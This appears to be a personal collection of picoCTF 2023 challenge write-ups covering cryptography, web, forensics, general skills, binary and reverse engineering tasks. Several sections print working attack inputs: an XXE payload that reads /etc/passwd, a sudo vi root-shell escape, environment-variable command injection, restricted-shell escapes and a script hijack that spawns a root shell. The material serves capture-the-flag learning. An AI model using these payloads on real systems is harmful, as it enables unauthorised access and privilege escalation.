
# Flag Format

picoCTF{fake_flag}

# Cryptography

## ReadMyCert

We download and run file, and find that it is a PEM certificate request file. We cat it, and it looks encoded. We google "Pem Certficate Request Cipher Decoder", and get to the following link.

https://certlogik.com/decoder/

## Rotation

We download and cat the file. It is very obviously an encrypted flag, and the first 7 letters are 'picoCTF'. We plug it into cyberchef, and cyberchef doesn't automatically decode it. We give cyberchef the "rot13" option, and play around with the offset. We find that rot13 with a -8 offset decrypts the flag.

## HideToSee

```stegseek atbash.jpg /usr/share/wordlists/rockyou.txt```

This one was tricky. Had to go through a lot of tools, and eventually stegseek worked. It's a very interesting tool - it went through all of rockyou.txt in a few seconds. Stegseek gave us the output of some sort of encrypted text. Based on the challenge name, it's an atbash cipher. Decod.fr has an atbash decoder to help us.

## SRA

This is a RSA challenge we netcat into. It gives us some parameters with names that correspond to sins, and expects a third. It can be inferred it is testing our knowledge of RSA. We are given a source code, and we can enumerate what variables correspond to what.

There's an extremly useful writeup that helped me brush up on general RSA concepts.

https://mregraoncyber.com/picoctf-writeup-rsa-pop-quiz/

It's important to figure out what is what, which is tricky. 

Vainglory is the user input.
Sloth is a the RSA exponent (e)
Gluttony and greed are two primes, P and Q.
Lust the product of Gluttony(P) and Greed(Q), so it is N.
Envy is the totient.
Anger is very likely the ciphertext, since it is calling the public key (e, N)

We are given Anger, and Envy. This is going to be very tricky, since we are effectively only given the ciphertext and the private exponent. We are de jure given the public exponent as well, since it is hardcoded to be 65537.

There's also an extremely useful stackexchange post that outlines the number theory here.

https://crypto.stackexchange.com/questions/105734/crack-rsa-with-e-and-d#comment226368_105734

The theory is this: there exists an equation relating e, d, p, and q.

It looks something like this = ed - 1 = kuv, where u  and v can be used to derive p and q via way of (2u + 1) = p.

So we break condense ed - 1 into some term T. We go to FactorDB, and have it factor (ed-1) for us. From the factors of (ed-1), some combination makes u, some combination makes v, and some combination makes t.

A better way to think of this, is that we choose a subset of (ed-1)'s factors, and that subset will multiply to u, v or k. For our purposes, we only really care about some subset generating u, and some subset generating v.

So, we write a loop that goes through this array, and tests every single possible combination of factors. It starts by choosinga combination of numbers that is the length of the array long, and then a combination that is the length - 1, until it reaches 0 and has gone through every single possible combination. 

This is an intensive process. Our loops runs a number of times equal to the geometric series of (L Choose N) + (L Choose (N-1)) ... (L Choose 0). 

It takes this combination of factors that has been chosen, and multiplies it. This gives us a candidate for u or v. We know from the script that 128 bit primes are used, so we can expect the length of u and v  to be somewhere around 124-126 bits. We estimate this by taking the log2 of the number, which gives us its estimated length in bits. If the length is not in the range of 124-126, we simply go to the next iteration.

If we have a valid u or v, we pass it to the next step. We transform it by way of (2u-1) = p. If the resultant p is prime, and if it is between 127-129 bits long, it could've been a prime that was used in the encryption process. We store it in an array.

Eventually, the loop finishes, and we have a list of canidate primes. Of this list, one of the primes is p, and one of them is q. By extension, somewhere in that list is a combination of two primes were used during the key generation process.

So, we use a process similar to the last one. We take the pool of primes, and iterate through every possible combination of two numbers of the array. It follows that one of these combinations MUST be p and q.

To check if we're correct, we can simply re-do the private key generation process. We were given d (private exponent) in the original equation. If our p and q generate the same d that we were given, we know that our combination for p and q must be correct. If this is the case, we use p and q to generate n, and decrypt with c, d, and n.

This gives us the plaintext, which we enter into the nc connection, and we will be greeted with the flag.


# Web Exploitation

## FindMe

curl -vL -d 'username=test&password=test!' URL

Burpsuite capture the response to the login

## More SQLi

The challenge name tells us one thing: this will be related to SQL injection. We start the instance, and because it's a web exploitation challenge, we open up Burpsuite. We are greeted with a login page.

We activate Burpsuite intercept and its proxy. We send a sample login request and capture the request. Burpsuite provides a handy "intruder" feature, which allows us to send payloads in a specific part of a request. We send the request to intruder, clear the auto-detected payloads, and tell Burpsuite that the test for "username" is our payload. We switch over to the "payload" section, and we want to pick a wordlist of potential payloads. I used /usr/share/seclists/SQLi/quick-SQLi.txt

## Match Regex

We are given a website. The first thing we should do is check the website's source code. Inside, we find an interesting JavaScript code snippet. 

```
<script>
	function send_request() {
		let val = document.getElementById("name").value;
		// ^p.....F!?
		fetch(`/flag?input=${val}`)
			.then(res => res.text())
			.then(res => {
				const res_json = JSON.parse(res);
				alert(res_json.flag)
				return false;
			})
		return false;
	}

</script>
```

There's a field for input text, and when we enter seemingly anything, it returns an error message for "wrong match! try again!". 
It seems to be running some sort of check. However, we are more interested in the comment. It is a regular expression phrase. 

We seemingly have enough to know the angle. Given that the name of the challenge is to "Match Regex", it's a logical assumption that we must create a phrase that matches some regular expression, probably the one leaked in the source code.

https://regex101.com/

This is a useful tool, since it allows us to enter a regular expression query, and test phrases against it. It's important to note the regex phrase is ```^p.....F!?```. We ignore the ```//```, since it is a JavaScript comment.

We can use the website to analyze the phrase - which looks like this

^ indicates the start of the expression. The 'p' will match to a 'p'. Each '.' will match any character. The '!' will match a '!' character. The `?` will match optionally, which means that something could exist there, but it's not mandatory.

Therefore a matching phrase would be ```p12345F!?```. Submitting this returns us the flag.

## SOAP

At the top of the challenge, we already have a hint in the name: XXE (external entity injection), and the name is SOAP. We do some googling, and the angle here is definitely an XML XXE attack.

To perform an XML XXE attack, we first need to capture some sort of post request. If we play around on the web page, we find that clicking on "details" generates a post request.

```
<?xml version="1.0" encoding="UTF-8"?>
	<data>
		<ID>2
		</ID>
</data>
```

https://portswigger.net/web-security/xxe

This website has a good guide on how to perform an XXE attack.

To do so, we need to modify the above request in two ways: define an XXE object, such that it loads the password file, and actually call the variable to be displayed.
```
<?xml version="1.0" encoding="UTF-8"?>

<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>

<data><ID>&xxe;</ID></data>
```

We modified the POST request that we captured in two ways: we defined an XXE object, and we made it so that command is loaded and called inbetween the ```<ID>``` tags, where the ID would normally go. If we send this payload to the server, in our request, instead of the ID 1, we actually get returned the contents of the file we specified: /etc/passwd. Within the /etc/passwd file is the flag.


# Forensics

## Who Is It

Look at the IP addresses, and run whois on the sender IP address. This will get you their identity.

## Hideme

It's a steg challenge, which usually involves using the correct tool.

```foremost -i flag.png```

Foremost is a tool that works with png files. It reveals to us some some secret hidden information, namely a zip file. We unzip the file, and are greeted with the flag.

## PCAP Poison

Search packet bytes for picoCTF, and the flag will pop up.

## Find and Open

We are given a PCAP file and a zip file. When we run strings on the PCAP file, we get what appears to be a base64 encoded string (it ends with an = sign, and consists of only numbers and letters). 

However, when we put it into cyberchef, it doesn't decode. We open it up in wireshark, and look around. We have a few things: some ethernet data, then some chromecast DNS requests, more ethernet, and then more chromecast. Going through the packets quickly, we find that what looked like the base64 string on packet 48.

The reason we couldn't decode it was because it contained extra information - some of the ethernet headers were leaking into the output from strings. When we copy the data as "hex and ascii", and throw it into cyberchef, cyberchef properly autodetects, decodes, and gets us half of the flag.

We are given a password protected zip, and given it can't be bruteforced (I tried with zip2john), we should try the password that we were given, which is also half of the flag. This successfully unlocks the zip file, and gives us the full flag.

# General Skills

## Chrono

The name implies that you should look for cronjobs. ```crontab -l``` did not list anything, and we cannot run it as sudo. I look around a little bit in the instance we had to SSH into. I find the flag in a .json file in the /challenge directory. 

## Permissions

We begin by SSHing into a challenge instance, and it's implied we need to be able to look at root folders. We need to privledge escalate, and my first instinct is to run sudo -l to see what we can run as root. We can run /usr/bin/vi as root.

We go to GTFObins to see what we can do with this. We enter the command vi, and we learn that we can run ```sudo vi -c ':!/bin/sh' /dev/null``` to privledge escalate and get a root shell. We find a hidden .flag file in the /root directory, which contains our flag.

## MoneyWare

We are given a bitcoin wallet address, and told it is associated with a certain malware. We simply google the bitcoin wallet address, and find it to be associated with "Petya" malware. The flag is picoCTF{Petya}.

## Rules 2023

This flag is in an image in the rules page. You cannot control+f for it, you must look for it. The alt text, however, can be copied and pasted.


## Repetitions

We are given an encoded string. It appears to be base64 encoded (the == at the end). We throw it into cyberchef, and we decode it from base64. This yields another base64 string. We do this multiple times, and eventually get the flag.

## Useless

We SSH into an instance, and are told there's an interesting script. The script itself is called "useless" isn't writable, and doesn't immediately appear to be exploitable. We run the command ```man useless``` in order to read the manual for the application. It gives us the flag.

## Special

Fun one. We SSH into an instance with what appears to have a special shell. After some experimentation, we can inject bash commands after four double quotes, into this special shell, to get ourselves command execution, like so:
```Special$ """"ls```

or 

```""\ls""```

We discover something called "blargh". When we try to cat it, the query seems to autoresolve to "cat large", for whatever reason. 

Running ``` """"cat * ``` reveals to us that 'blargh' is actually a directory. 

We run ```""""ls blargh/``` to enumerate the directory, and we find it contains a flag.txt. For whateer reason, the shell will absolutely not let us change directories. So we just cat the file, referencing the path. Our final payload that gets us the flag looks like this:

```""""cat blargh/flag.txt```

## Specialer

Sequel to Special. We SSH into a shell with very limited functionality. I begin with running 

```compgen -c``` 

to see what commands are available, after some manual testing. We cannot ls, so we need to find an alternative way of enumerating data. We can run echo, which is promising.

```echo *``` 

Enumerates for us. The cat command is unavailable, so now we just need a way of reading file contents.

https://stackoverflow.com/questions/22377792/how-to-use-echo-command-to-print-out-content-of-a-text-file


```echo "$(<a.txt )"```

Will print the content of a.txt. We have a way to enumerate directory contents and grab files, so it's just a matter of finding the right file. The flag is in ~/ala/kazam.txt

# Binary Exploitation

# babygame01

We NC into an instance, and we can move some character around with WASD. We have to reach the exit, and collect a flag. 

We could check everything manually, but it'd take too much time

# Hijacking

We are given a  python script that we can write to. We can run this script as root. We have to figure out a way of gaining root code execution via this script. We overwrite the script to simply spawn a root shell when it is called.

```
import os

os.system("/bin/sh")
```

Spawns a root interactive shell. The flag is in a hidden file in the /root directory.

# two-sum

We netcat into an instance, and must give two numbers such that 

```n1 > n1 + n2 OR n2 > n1 + n2```

Think it about it logically: two positive numbers will always make this false, since two positive numbers summed will be greater than either individual number. We cannot have negative numbers. 

What if we give two numbers, and cause the program to error?

```1000000000 99999999999999999``` 

gets us the flag.

# VNE

We are given a binary that will run ls as root, on whatever the enviroment variable SECRET_DIR is set to. We can enumerate the contents of the root directory like this:

```
export SECRET_DIR="/root"

./bin
```

This isn't much, so we try command injection to see if we can get the binary to run other things as root

```
export SECRET_DIR="/root; cat /root/flag.txt"

./bin
```

Yields the flag.

# tic-tac

We are told to ssh into an instance, with a binary that will read a text file as root, but you must own the text file to read it. There is a flag.txt owned by root in the same directory. We are given a src.cpp in the same directory, which appears to be the source file for the binary.


# Reverse Engineering

## Safe Opener 2

We are given a .class file. It is a compiled Java file. We plug it into an online Java decompiler, and get the flag.

## Reverse

Run strings on it, grep for 'pico' and it pops right up.

## Timer

This one was a little tricky for me. I eventually end up using apktool on it 

```apktool d timer.apk```

This creates a directory with information on the apk. I enter the directory, and rather than looking for everything, I grep for 'pico' in the directory contents.

```grep -r 'picoctf'```

Yields the flag.

# Ready Gladiator 0

This marks a series of three challenges based on the game "core wars". In core wars, you think of the game as two programs "fighting" each other.

The goal here is to make a warrior that always loses. To do this, we simply change the "1" in the imp.red program they give us, to a 0. This causes the other program to "win" in the context of core wars rules. Why? Because of the way the imp works - it is moving and copying itself. Our program isn't.

# Ready Gladiator 1

Now, we need to actually make something that wins. If you do some research onto "core wars", you get into a rabbit hole. It's an interesting strategy game, with a lot of depth. More importantly, there's a lot of dicussion on it. The "imp.red" we are given is actually a classical warrior in the context of the game. As such, there is documentation on beating it.

We only need to win once for this challenge.

https://corewar-docs.readthedocs.io/en/latest/corewar/strategies/

The above link contains some basic strategies for the game, along with the corresponding templates. I grab one: the dwarf. I copy and paste it into a file to use in the picoCTF instance.

```
;redcode
;name dwarf
;assert 1
start   add.ab  #4, bmb
        mov.i   bmb, @bmb
        jmp     start
bmb     dat     #0, #0
end
```

This "dwarf" will defeat the other program, the "imp", and yield us the victory, and the flag. 

# Ready Gladiator 2

This is the third and final Core Wars challenge. It's the same concept as the above two, but this time, we need to create an undeafable program, that will win every single battle against the imp - 100 times.

Funnily enough, there's a reddit post on this exact subject - creating a program that will beat the imp every time. Our warrior needs to look like this.

```
;redcode
;name predator
;assert 1
start   JMP 0, <-5
end

```

The way this works is by messing around with the memory addresses, such that when the imp's program attempts to execute, it simply fails. This will beat the imp every time, and yield us the flag.

# Retrospective

Honestly, should've done more binary exploitation, and tried harder on the AES crypto challenges. The Java Code Analysis should've been free as well, but my web exploitation skills are something I need to work on.